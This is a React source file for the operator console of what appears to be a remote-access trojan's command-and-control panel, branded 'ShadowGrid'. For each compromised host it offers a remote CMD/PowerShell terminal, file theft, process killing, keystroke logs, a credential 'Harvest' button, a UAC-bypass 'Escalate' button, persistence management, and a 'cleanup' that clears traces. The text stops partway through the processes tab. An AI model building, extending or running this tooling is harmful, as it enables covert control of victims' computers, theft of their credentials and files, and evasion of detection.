import React, { useState, useEffect, useRef, useCallback } from 'react';
import { api } from '../api';
import Modal from '../components/Modal';
import ConfirmModal from '../components/ConfirmModal';
import useInteract from '../hooks/useInteract';

/* ========== HELPERS ========== */

function countryFlag(code) {
  if (!code || code.length !== 2) return '';
  return String.fromCodePoint(
    ...code.toUpperCase().split('').map(c => 0x1F1E6 + c.charCodeAt(0) - 65)
  );
}

const timeSince = (d) => {
  if (!d) return '-';
  const s = Math.floor((Date.now() - new Date(d).getTime()) / 1000);
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  return Math.floor(s / 3600) + 'h ago';
};

/** Send a task and poll for its result. Returns parsed output or null on timeout. */
async function sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs = 60000) {
  try {
    const res = await api.createTask(agentId, taskType, args);
    const taskId = res.id;
    const maxAttempts = Math.ceil(timeoutMs / 2000);
    for (let i = 0; i < maxAttempts; i++) {
      await new Promise(r => setTimeout(r, 2000));
      const elapsed = (i + 1) * 2;
      if (onProgress) onProgress(elapsed, timeoutMs / 1000);
      const results = await api.getAgentResults(agentId);
      const result = results.find(r => r.task_id === taskId);
      if (result) {
        try {
          const parsed = JSON.parse(result.output);
          onResult(parsed);
        } catch {
          onResult(result.output);
        }
        return;
      }
    }
    onResult(null); // timeout
  } catch (e) {
    onResult(null);
  }
}

/**
 * wsSendAndPoll - Tries WebSocket first. Falls back to sendAndPoll if WS is disconnected.
 * Has same callback API as sendAndPoll for drop-in replacement.
 */
function wsSendAndPoll(wsSend, wsConnected, agentId, taskType, args, onResult, onProgress, timeoutMs = 60000) {
  if (wsConnected && wsSend) {
    // Use WebSocket path - instant results
    wsSend(taskType, args, timeoutMs).then(
      (result) => onResult(result),
      (err) => {
        // WebSocket failed, fall back to polling
        if (err.message === 'Not connected' || err.message === 'Disconnected') {
          sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs);
        } else if (err.message === 'Timeout') {
          onResult(null);
        } else {
          onResult(null);
        }
      }
    );
  } else {
    // Fallback to polling
    sendAndPoll(agentId, taskType, args, onResult, onProgress, timeoutMs);
  }
}

/* ========== CONTEXT MENU ========== */

function ContextMenu({ x, y, items, onClose }) {
  const ref = useRef(null);
  useEffect(() => {
    const handler = (e) => {
      if (ref.current && !ref.current.contains(e.target)) onClose();
    };
    document.addEventListener('mousedown', handler);
    return () => document.removeEventListener('mousedown', handler);
  }, [onClose]);

  if (!items || items.length === 0) return null;

  const posX = Math.min(x, window.innerWidth - 220);
  const posY = Math.min(y, window.innerHeight - items.length * 36);

  return (
    <div ref={ref} style={{
      position: 'fixed', left: posX, top: posY, zIndex: 99999,
      background: '#1a1c20', border: '1px solid rgba(255,255,255,0.1)',
      minWidth: 200, padding: '4px 0', fontFamily: 'var(--font-mono)', fontSize: 12,
    }}>
      {items.map((item, i) =>
        item.separator ? (
          <div key={i} style={{ height: 1, background: 'rgba(255,255,255,0.1)', margin: '4px 0' }} />
        ) : (
          <div key={i} onClick={() => { item.onClick?.(); onClose(); }} style={{
            padding: '7px 16px', color: item.danger ? 'var(--red)' : 'rgba(255,255,255,0.7)',
            cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 10,
          }} onMouseEnter={e => e.currentTarget.style.background = item.danger ? 'rgba(255,68,68,0.1)' : 'rgba(255,255,255,0.05)'}
             onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
            {item.icon && <span style={{ width: 16, textAlign: 'center', fontSize: 13 }}>{item.icon}</span>}
            <span>{item.label}</span>
            {item.shortcut && <span style={{ marginLeft: 'auto', color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>{item.shortcut}</span>}
          </div>
        )
      )}
    </div>
  );
}

/* ========== TOAST ========== */

let _toastTimeout;
function useToast() {
  const [msg, setMsg] = useState(null);
  const show = useCallback((text) => {
    setMsg(text);
    clearTimeout(_toastTimeout);
    _toastTimeout = setTimeout(() => setMsg(null), 2000);
  }, []);
  return [msg, show];
}

function Toast({ msg }) {
  if (!msg) return null;
  return (
    <div style={{
      position: 'fixed', bottom: 20, right: 20, background: '#1a1c20',
      border: '1px solid var(--green)', color: 'var(--green)',
      padding: '10px 20px', fontFamily: 'var(--font-mono)', fontSize: 12,
      zIndex: 999999, transition: 'all .3s',
    }}>{msg}</div>
  );
}

/* ========== MAIN MODAL ========== */

const TABS = [
  { key: 'terminal', icon: '⌘', label: 'Terminal' },
  { key: 'files', icon: '📁', label: 'Files' },
  { key: 'processes', icon: '⚙', label: 'Processes' },
  { key: 'display', icon: '🖥', label: 'Display' },
  { key: 'remote', icon: '🖥', label: 'Remote' },
  { key: 'keylog', icon: '⌨', label: 'Input Log' },
  { key: 'vault', icon: '🔑', label: 'Vault' },
  { key: 'registry', icon: '🗂', label: 'Registry' },
  { key: 'persistence', icon: '📌', label: 'Persistence' },
  { key: 'network', icon: '🌐', label: 'Network' },
  { key: 'settings', icon: '⚙', label: 'Settings' },
];

function useIsMobile() {
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  useEffect(() => {
    const handler = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handler);
    return () => window.removeEventListener('resize', handler);
  }, []);
  return isMobile;
}

export default function AgentModal({ agent, onClose }) {
  const [tab, setTab] = useState('terminal');
  const [creds, setCreds] = useState([]);
  const [toastMsg, showToast] = useToast();
  const [showKillConfirm, setShowKillConfirm] = useState(false);
  const isMobile = useIsMobile();
  const { connected: wsConnected, send: wsSend } = useInteract(agent.id);

  // Create a bound send wrapper that all tabs can use
  const interactSend = useCallback((taskType, args, onResult, onProgress, timeoutMs) => {
    wsSendAndPoll(wsSend, wsConnected, agent.id, taskType, args, onResult, onProgress, timeoutMs);
  }, [wsSend, wsConnected, agent.id]);

  useEffect(() => {
    api.getCredentials('agent_id=' + agent.id).then(setCreds).catch(() => {});
  }, [agent.id]);

  const statusColor = agent.status === 'dead' ? 'var(--red)' : agent.status === 'dormant' ? 'var(--yellow)' : 'var(--green)';

  return (
    <Modal onClose={onClose}>
      {/* HEADER */}
      <div style={{
        display: 'flex', alignItems: isMobile ? 'flex-start' : 'center', justifyContent: 'space-between',
        padding: isMobile ? '8px 10px' : '10px 16px', background: '#1f2228', borderBottom: '1px solid var(--border)', flexShrink: 0,
        flexDirection: isMobile ? 'column' : 'row', gap: isMobile ? 6 : 0,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: isMobile ? 6 : 12, fontSize: isMobile ? 11 : 12, fontFamily: 'var(--font-mono)', flexWrap: isMobile ? 'wrap' : 'nowrap' }}>
          <span style={{ width: 8, height: 8, background: statusColor, display: 'inline-block', animation: agent.status === 'active' ? 'pulse 2s infinite' : 'none', flexShrink: 0 }} />
          <span style={{ fontSize: isMobile ? 14 : 16 }}>{countryFlag(agent.country)}</span>
          <span style={{ fontWeight: 600 }}>{agent.hostname || agent.id?.substring(0, 10).toUpperCase()}</span>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
          <span style={{ color: 'rgba(255,255,255,0.5)' }}>USER</span>
          <span>{agent.username || '-'}</span>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
          <span style={{ color: 'rgba(255,255,255,0.5)' }}>OS</span>
          <span>{agent.os || '-'}</span>
          {!isMobile && <>
            <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
            <span style={{ color: 'rgba(255,255,255,0.5)' }}>IP</span>
            <span>{agent.ip_internal || '-'}</span>
            <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
            <span style={{ color: 'rgba(255,255,255,0.5)' }}>EXT</span>
            <span>{agent.ip_external || '-'}</span>
            {agent.isp && <>
              <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
              <span style={{ color: 'rgba(255,255,255,0.5)' }}>ISP</span>
              <span>{agent.isp}</span>
            </>}
          </>}
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
          <span style={{ color: 'rgba(255,255,255,0.5)' }}>LAST</span>
          <span style={{ color: statusColor }}>{timeSince(agent.last_seen)}</span>
          <span style={{ color: 'rgba(255,255,255,0.3)' }}>│</span>
          <span style={{ display: 'inline-flex', alignItems: 'center', gap: 4 }}>
            <span style={{ width: 6, height: 6, background: wsConnected ? 'var(--green)' : 'var(--red)', display: 'inline-block', borderRadius: '50%', animation: wsConnected ? 'pulse 2s infinite' : 'none' }} />
            <span style={{ color: wsConnected ? 'var(--green)' : 'var(--red)', fontSize: 9, fontWeight: 600 }}>{wsConnected ? 'LIVE' : 'POLL'}</span>
          </span>
        </div>
        <div style={{ display: 'flex', gap: isMobile ? 4 : 6, flexShrink: 0 }}>
          <HeaderBtn label={isMobile ? '📸' : '⬜ Screenshot'} onClick={() => { api.createTask(agent.id, 'display_capture', {}); showToast('📸 Screenshot captured'); }} />
          <HeaderBtn label={isMobile ? '⚷' : '⚷ Harvest'} cls="harvest" onClick={() => { api.createTask(agent.id, 'vault_reader', {}); showToast('🔑 Harvesting credentials...'); }} />
          <HeaderBtn label={isMobile ? '↑' : '↑ Escalate'} cls="escalate" onClick={() => { api.createTask(agent.id, 'uac_bypass', {}); showToast('⚡ Attempting privilege escalation...'); }} />
          <button onClick={onClose} style={{
            background: 'none', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.5)',
            fontSize: 16, width: 30, height: 30, display: 'flex', alignItems: 'center', justifyContent: 'center',
            cursor: 'pointer', marginLeft: isMobile ? 4 : 10, fontFamily: 'var(--font-mono)', minWidth: 30, minHeight: 30,
          }}>✕</button>
        </div>
      </div>

      {/* TAB BAR */}
      <div style={{
        display: 'flex', borderBottom: '1px solid var(--border)', background: '#1f2228',
        flexShrink: 0, overflowX: 'auto', WebkitOverflowScrolling: 'touch',
        scrollbarWidth: 'none', msOverflowStyle: 'none',
      }} className="agent-modal-tabs">
        {TABS.map(t => (
          <div key={t.key} onClick={() => setTab(t.key)} style={{
            padding: isMobile ? '8px 10px' : '9px 16px', fontSize: isMobile ? 9 : 11, cursor: 'pointer',
            borderBottom: tab === t.key ? '2px solid var(--green)' : '2px solid transparent',
            color: tab === t.key ? 'var(--green)' : 'rgba(255,255,255,0.5)',
            whiteSpace: 'nowrap', textTransform: 'uppercase', letterSpacing: 0.5,
            fontFamily: 'var(--font-mono)', transition: 'all .15s',
            minHeight: 44, display: 'flex', alignItems: 'center',
          }}>{isMobile ? t.label : `${t.icon} ${t.label}`}</div>
        ))}
      </div>

      {/* TAB CONTENT */}
      <div style={{ flex: 1, overflow: 'auto', display: 'flex', flexDirection: 'column', WebkitOverflowScrolling: 'touch' }}>
        {tab === 'terminal' && <TerminalTab agent={agent} showToast={showToast} interactSend={interactSend} />}
        {tab === 'files' && <FilesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
        {tab === 'processes' && <ProcessesTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
        {tab === 'display' && <DisplayTab agentId={agent.id} showToast={showToast} />}
        {tab === 'remote' && <RemoteDesktopTab agent={agent} showToast={showToast} />}
        {tab === 'keylog' && <InputLogTab agentId={agent.id} showToast={showToast} />}
        {tab === 'vault' && <VaultTab creds={creds} agentId={agent.id} showToast={showToast} isMobile={isMobile} />}
        {tab === 'registry' && <RegistryTab agentId={agent.id} showToast={showToast} isMobile={isMobile} interactSend={interactSend} />}
        {tab === 'persistence' && <PersistenceTab agentId={agent.id} showToast={showToast} interactSend={interactSend} />}
        {tab === 'network' && <NetworkTab agentId={agent.id} showToast={showToast} />}
        {tab === 'settings' && <SettingsTab agentId={agent.id} agent={agent} showToast={showToast} />}
      </div>

      <Toast msg={toastMsg} />
      <ConfirmModal open={showKillConfirm} title="CONFIRM AGENT KILL"
        message="This will terminate the agent, remove all persistence, and clear traces. The agent will NOT reconnect. This is IRREVERSIBLE."
        detail={<>
          <div><span style={{ color: 'var(--text-muted)' }}>AGENT: </span><span style={{ color: 'var(--green)' }}>{agent.hostname || agent.id?.substring(0, 10)}</span></div>
          <div><span style={{ color: 'var(--text-muted)' }}>USER: </span>{agent.username}</div>
          <div style={{ color: 'var(--red)', marginTop: 4 }}>All persistence will be removed. The agent will not reconnect.</div>
        </>}
        confirmLabel="KILL AGENT"
        onConfirm={() => { api.createTask(agent.id, 'cleanup', {}); showToast('☠ Agent terminated'); setShowKillConfirm(false); }}
        onCancel={() => setShowKillConfirm(false)} />
    </Modal>
  );
}

function HeaderBtn({ label, cls, onClick }) {
  const colors = {
    harvest: { border: 'rgba(0,255,136,0.3)', color: 'var(--green)', hover: 'rgba(0,255,136,0.1)' },
    escalate: { border: 'rgba(255,170,0,0.3)', color: 'var(--yellow)', hover: 'rgba(255,170,0,0.1)' },
    kill: { border: 'rgba(255,68,68,0.3)', color: 'var(--red)', hover: 'rgba(255,68,68,0.1)' },
  };
  const c = colors[cls] || { border: 'var(--border)', color: 'rgba(255,255,255,0.7)', hover: 'rgba(255,255,255,0.1)' };
  return (
    <button onClick={onClick} style={{
      background: 'rgba(255,255,255,0.05)', border: `1px solid ${c.border}`, color: c.color,
      fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 12px', cursor: 'pointer',
    }} onMouseEnter={e => e.currentTarget.style.background = c.hover}
       onMouseLeave={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}>{label}</button>
  );
}

/* ===== STYLES SHARED ===== */
const S = {
  toolbar: { display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px', borderBottom: '1px solid var(--border)', background: '#1f2228', flexShrink: 0, fontFamily: 'var(--font-mono)' },
  toolInput: { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 10px', outline: 'none', minWidth: 180 },
  toolBtn: { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: 'rgba(255,255,255,0.7)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '5px 12px', cursor: 'pointer', whiteSpace: 'nowrap' },
  btnSuccess: { background: 'rgba(0,255,136,0.1)', borderColor: 'rgba(0,255,136,0.3)', color: 'var(--green)' },
  btnDanger: { background: 'rgba(255,68,68,0.1)', borderColor: 'rgba(255,68,68,0.3)', color: 'var(--red)' },
  btnWarn: { background: 'rgba(255,170,0,0.1)', borderColor: 'rgba(255,170,0,0.3)', color: 'var(--yellow)' },
  th: { background: '#1f2228', padding: '7px 10px', textAlign: 'left', color: 'rgba(255,255,255,0.5)', fontWeight: 500, borderBottom: '1px solid var(--border)', cursor: 'pointer', whiteSpace: 'nowrap', userSelect: 'none', fontSize: 11, textTransform: 'uppercase', letterSpacing: '0.3px', fontFamily: 'var(--font-mono)' },
  td: { padding: '6px 10px', borderBottom: '1px solid rgba(255,255,255,0.04)', whiteSpace: 'nowrap', fontSize: 12, fontFamily: 'var(--font-mono)' },
  splitPanel: { display: 'flex', flex: 1, overflow: 'hidden' },
  splitLeft: { width: 260, minWidth: 200, borderRight: '1px solid var(--border)', overflowY: 'auto', background: '#15171b' },
  splitRight: { flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column' },
  sectionTitle: { fontSize: 12, color: 'rgba(255,255,255,0.5)', textTransform: 'uppercase', letterSpacing: 0.5, padding: '12px 12px 8px', borderBottom: '1px solid var(--border)', display: 'flex', alignItems: 'center', justifyContent: 'space-between', fontFamily: 'var(--font-mono)' },
  tag: (color) => ({ display: 'inline-block', padding: '1px 6px', fontSize: 10, border: `1px solid ${color}30`, color: color, background: `${color}14`, fontFamily: 'var(--font-mono)' }),
};

/* ========== TERMINAL TAB ========== */
function TerminalTab({ agent, showToast, interactSend }) {
  const [history, setHistory] = useState([]);
  const [input, setInput] = useState('');
  const [working, setWorking] = useState(false);
  const [shell, setShell] = useState('cmd');
  const [cmdHistory, setCmdHistory] = useState([]);
  const [historyIdx, setHistoryIdx] = useState(-1);
  const [pollInfo, setPollInfo] = useState(null);
  const termRef = useRef(null);
  const inputRef = useRef(null);

  const sendCommand = async (cmd) => {
    if (!cmd.trim() || working) return;
    setHistory(prev => [...prev, { type: 'input', text: cmd }]);
    setCmdHistory(prev => [cmd, ...prev]);
    setHistoryIdx(-1);
    setInput('');
    setWorking(true);
    setPollInfo(null);

    interactSend('terminal', { cmd }, (result) => {
      if (result !== null) {
        setHistory(prev => [...prev, { type: 'output', text: typeof result === 'string' ? result : JSON.stringify(result, null, 2) }]);
      } else {
        setHistory(prev => [...prev, { type: 'error', text: 'Timeout: no response from agent' }]);
      }
      setWorking(false);
      setPollInfo(null);
    }, (elapsed, total) => {
      setPollInfo({ elapsed, total });
    });
  };

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') { e.preventDefault(); sendCommand(input); }
    else if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (cmdHistory.length > 0) {
        const idx = Math.min(historyIdx + 1, cmdHistory.length - 1);
        setHistoryIdx(idx);
        setInput(cmdHistory[idx]);
      }
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIdx > 0) { setHistoryIdx(historyIdx - 1); setInput(cmdHistory[historyIdx - 1]); }
      else { setHistoryIdx(-1); setInput(''); }
    }
  };

  useEffect(() => { termRef.current && (termRef.current.scrollTop = termRef.current.scrollHeight); }, [history, working]);
  useEffect(() => { inputRef.current?.focus(); }, [working]);

  const prompt = shell === 'ps' ? 'PS> ' : 'C:\\> ';

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>SHELL:</span>
        <select value={shell} onChange={e => setShell(e.target.value)} style={{
          background: '#15171b', border: '1px solid var(--border)', color: '#fff',
          fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px', outline: 'none',
        }}>
          <option value="cmd">CMD</option>
          <option value="ps">PowerShell</option>
        </select>
        <button style={S.toolBtn} onClick={() => setHistory([])}>Clear</button>
        <div style={{ flex: 1 }} />
        <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>Encoding: UTF-8</span>
      </div>
      <div style={{ flex: 1, display: 'flex', flexDirection: 'column', background: '#0a0c10', overflow: 'hidden' }}>
        <div ref={termRef} onClick={() => inputRef.current?.focus()} style={{
          flex: 1, overflowY: 'auto', padding: 12, fontSize: 12, lineHeight: 1.6, fontFamily: 'var(--font-mono)', cursor: 'text',
        }}>
          <div style={{ color: 'var(--green)', marginBottom: 8 }}>
            [ShadowGrid] Connected to {agent.hostname || agent.id?.substring(0, 8)} ({agent.os || 'unknown'})
          </div>
          {history.map((entry, i) => (
            <div key={i} style={{ marginBottom: 2, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
              {entry.type === 'input' && <><span style={{ color: 'var(--green)' }}>{prompt}</span><span style={{ color: '#fff' }}>{entry.text}</span></>}
              {entry.type === 'output' && <span style={{ color: 'rgba(255,255,255,0.7)' }}>{entry.text}</span>}
              {entry.type === 'error' && <span style={{ color: 'var(--red)' }}>{entry.text}</span>}
            </div>
          ))}
          {working && <div style={{ color: 'var(--yellow)' }}>
            ⏳ executing...{pollInfo && <span style={{ marginLeft: 8, fontSize: 10 }}> Waiting for agent... {pollInfo.elapsed}s / {pollInfo.total}s</span>}
            {pollInfo && pollInfo.elapsed >= 30 && <div style={{ fontSize: 10, color: 'rgba(255,170,0,0.7)', marginTop: 2 }}>Agent may be slow to respond. Still waiting...</div>}
          </div>}
        </div>
        <div style={{ display: 'flex', alignItems: 'center', padding: '0 12px 12px 12px', background: '#0a0c10', gap: 0 }}>
          <span style={{ color: 'var(--green)', fontSize: 12, whiteSpace: 'pre', fontFamily: 'var(--font-mono)' }}>{prompt}</span>
          <input ref={inputRef} value={input} onChange={e => setInput(e.target.value)}
            onKeyDown={handleKeyDown} disabled={working} autoFocus spellCheck="false"
            style={{
              flex: 1, background: 'transparent', border: 'none', color: '#fff',
              fontFamily: 'var(--font-mono)', fontSize: 12, outline: 'none', caretColor: 'var(--green)',
            }} />
        </div>
      </div>
    </div>
  );
}

/* ========== FILES TAB (Split Panel) ========== */
function FilesTab({ agentId, showToast, isMobile, interactSend }) {
  const [path, setPath] = useState(['C:\\']);
  const [files, setFiles] = useState([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);
  const [ctx, setCtx] = useState(null);
  const [selectedFile, setSelectedFile] = useState(null);
  const [pollProgress, setPollProgress] = useState(null);

  const buildPath = (segments) => {
    if (segments.length === 1 && segments[0].endsWith('\\')) return segments[0];
    return segments.join('\\');
  };

  const currentPath = buildPath(path);

  const loadFiles = (targetPath) => {
    const p = targetPath || currentPath;
    setLoading(true);
    setError(null);
    setFiles([]);
    setPollProgress(null);
    interactSend('storage_list', { path: p }, (result) => {
      setLoading(false);
      setPollProgress(null);
      if (result && Array.isArray(result)) {
        result.sort((a, b) => {
          if (a.is_dir && !b.is_dir) return -1;
          if (!a.is_dir && b.is_dir) return 1;
          return a.name.localeCompare(b.name);
        });
        setFiles(result);
      } else if (result) {
        setError(typeof result === 'string' ? result : JSON.stringify(result));
      } else {
        setError('Timeout: no response from agent');
      }
    }, (elapsed, total) => {
      setPollProgress({ elapsed, total });
    });
  };

  const navigateTo = (folder) => {
    const newPath = [...path, folder];
    setPath(newPath);
    loadFiles(buildPath(newPath));
  };

  const navigateUp = () => {
    if (path.length > 1) {
      const newPath = path.slice(0, -1);
      setPath(newPath);
      loadFiles(buildPath(newPath));
    }
  };

  const navigateBreadcrumb = (index) => {
    const newPath = path.slice(0, index + 1);
    setPath(newPath);
    loadFiles(buildPath(newPath));
  };

  const formatSize = (bytes) => {
    if (!bytes || bytes === 0) return '-';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
    return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
  };

  const formatDate = (ts) => !ts ? '-' : new Date(ts * 1000).toLocaleString();

  const fileContextItems = (file) => [
    ...(file.is_dir ? [{ label: 'Open', icon: '📂', onClick: () => navigateTo(file.name) }] : [
      { label: 'Download', icon: '⬇', shortcut: 'Ctrl+D', onClick: () => { api.createTask(agentId, 'storage_upload', { path: currentPath + '\\' + file.name }); showToast('⬇ Download queued'); } },
    ]),
    { separator: true },
    { label: 'Copy Path', icon: '📋', onClick: () => { navigator.clipboard.writeText(currentPath + '\\' + file.name); showToast('📋 Path copied'); } },
    { separator: true },
    { label: 'Delete', icon: '🗑', danger: true, shortcut: 'Del', onClick: () => { api.createTask(agentId, 'storage_delete', { path: currentPath + '\\' + file.name }); showToast('🗑 Deleted'); } },
  ];

  return (
    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
      <div style={S.toolbar}>
        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📤 Upload not implemented yet')}>{isMobile ? '↑' : '↑ Upload'}</button>
        <button style={S.toolBtn} onClick={() => showToast('📁 New folder not implemented yet')}>{isMobile ? '+' : '+ New Folder'}</button>
        <button style={S.toolBtn} onClick={() => loadFiles()} disabled={loading}>{loading ? '⏳...' : isMobile ? '↻' : '↻ Refresh'}</button>
        <div style={{ flex: 1 }} />
      </div>
      {/* Breadcrumb */}
      <div style={{
        display: 'flex', alignItems: 'center', gap: 4, padding: '8px 12px',
        borderBottom: '1px solid var(--border)', fontSize: 12, background: '#1f2228', fontFamily: 'var(--font-mono)',
        flexWrap: 'wrap',
      }}>
        {path.map((p, i) => (
          <React.Fragment key={i}>
            {i > 0 && <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 10 }}>›</span>}
            <span
              style={{ color: i === path.length - 1 ? 'var(--green)' : 'rgba(255,255,255,0.5)', cursor: 'pointer' }}
              onClick={() => navigateBreadcrumb(i)}
            >{p}</span>
          </React.Fragment>
        ))}
      </div>
      {/* Split panel */}
      <div style={S.splitPanel}>
        {!isMobile && (
          <div style={S.splitLeft}>
            <div style={{ padding: 8 }}>
              <div style={{ color: 'rgba(255,255,255,0.5)', fontSize: 10, textTransform: 'uppercase', marginBottom: 8, fontFamily: 'var(--font-mono)' }}>Folder Tree</div>
              <div onClick={navigateUp} style={{ padding: '4px 8px', cursor: path.length > 1 ? 'pointer' : 'default', color: path.length > 1 ? 'var(--green)' : 'rgba(255,255,255,0.3)', fontSize: 12, fontFamily: 'var(--font-mono)' }}>
                📁 ..
              </div>
              {files.filter(f => f.is_dir).map((f, i) => (
                <div key={i} onClick={() => navigateTo(f.name)} style={{
                  padding: '4px 8px', cursor: 'pointer', color: '#61afef', fontSize: 12, fontFamily: 'var(--font-mono)',
                }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
                   onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                  📁 {f.name}
                </div>
              ))}
            </div>
          </div>
        )}
        <div style={S.splitRight}>
          {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
          <div style={{ flex: 1, overflowY: 'auto', overflowX: isMobile ? 'auto' : 'hidden' }}>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead><tr>
                <th style={{ ...S.th, width: 24 }}></th>
                <th style={S.th}>Name</th>
                {!isMobile && <th style={S.th}>Size</th>}
                {!isMobile && <th style={S.th}>Modified</th>}
                <th style={{ ...S.th, width: 70 }}>{isMobile ? '' : 'Actions'}</th>
              </tr></thead>
              <tbody>
                {files.length === 0 && !loading && (
                  <tr><td colSpan={isMobile ? 3 : 5} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click Refresh to browse filesystem</td></tr>
                )}
                {loading && (
                  <tr><td colSpan={isMobile ? 3 : 5} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>
                    ⏳ Waiting for agent response...
                    {pollProgress && <span style={{ marginLeft: 8, fontSize: 10 }}>{pollProgress.elapsed}s / {pollProgress.total}s</span>}
                    {pollProgress && pollProgress.elapsed >= 30 && <div style={{ fontSize: 10, color: 'rgba(255,170,0,0.7)', marginTop: 4 }}>Agent may be slow to respond. Still waiting...</div>}
                  </td></tr>
                )}
                {files.map((f, i) => (
                  <tr key={i} style={{ cursor: 'pointer' }}
                    onClick={() => f.is_dir && navigateTo(f.name)}
                    onContextMenu={e => { e.preventDefault(); setSelectedFile(f); setCtx({ x: e.clientX, y: e.clientY, items: fileContextItems(f) }); }}
                    onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.03)'}
                    onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    <td style={S.td}>{f.is_dir ? '📁' : '📄'}</td>
                    <td style={{ ...S.td, color: f.is_dir ? '#61afef' : '#fff' }}>{f.name}</td>
                    {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{f.is_dir ? '-' : formatSize(f.size)}</td>}
                    {!isMobile && <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{formatDate(f.modified)}</td>}
                    <td style={S.td}>
                      {!f.is_dir && <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10, minHeight: 44, minWidth: 44 }}
                        onClick={e => { e.stopPropagation(); api.createTask(agentId, 'storage_upload', { path: currentPath + '\\' + f.name }); showToast('⬇ Downloading'); }}>⬇</button>}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      </div>
      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
    </div>
  );
}

/* ========== PROCESSES TAB ========== */
function ProcessesTab({ agentId, showToast, isMobile, interactSend }) {
  const [processes, setProcesses] = useState([]);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState('');
  const [sortCol, setSortCol] = useState('pid');
  const [sortDir, setSortDir] = useState(1);
  const [filterMode, setFilterMode] = useState('all');
  const [killTarget, setKillTarget] = useState(null);
  const [ctx, setCtx] = useState(null);
  const [selectedProcs, setSelectedProcs] = useState(new Set());
  const intervalRef = useRef(null);

  const fetchProcesses = useCallback(() => {
    setLoading(true);
    interactSend('task_viewer_list', {}, (result) => {
      setLoading(false);
      if (result && Array.isArray(result)) {
        setProcesses(result);
      }
    });
  }, [interactSend]);

  useEffect(() => {
    fetchProcesses();
    intervalRef.current = setInterval(fetchProcesses, 10000);
    return () => clearInterval(intervalRef.current);
  }, [fetchProcesses]);

  const handleSort = (col) => {
    if (sortCol === col) setSortDir(d => d * -1);
    else { setSortCol(col); setSortDir(1); }
  };

  const isSystemProc = (p) => {
    const sysUsers = ['system', 'local service', 'network service', 'dwm-1'];
    return sysUsers.some(u => (p.user || '').toLowerCase().includes(u));
  };

  const filtered = processes.filter(p => {
    if (search) {
      const s = search.toLowerCase();
      if (!(p.name || '').toLowerCase().includes(s) && !String(p.pid).includes(s) && !(p.user || '').toLowerCase().includes(s)) return false;
    }
    if (filterMode === 'user') return !isSystemProc(p);
    if (filterMode === 'system') return isSystemProc(p);
    return true;
  });

  const sorted = [...filtered].sort((a, b) => {
    let va = a[sortCol], vb = b[sortCol];
    if (typeof va === 'string') return va.localeCompare(vb) * sortDir;
    return ((va || 0) - (vb || 0)) * sortDir;
  });

  const killProcess = (pid) => {
    interactSend('task_viewer_kill', { pid }, () => {
      showToast(`☠ Killed PID ${pid}`);
      setTimeout(fetchProcesses, 2000);
    });
    setKillTarget(null);
  };

  const sortArrow = (col) => sortCol === col ? (sortDir === 1 ? ' ▲' : ' ▼') : '';

  const procCtxItems = (p) => [
    { label: 'Kill Process', icon: '☠', danger: true, onClick: () => setKillTarget(p) },
    { separator: true },
    { label: `PID: ${p.pid}`, icon: 'ℹ' },
  ];
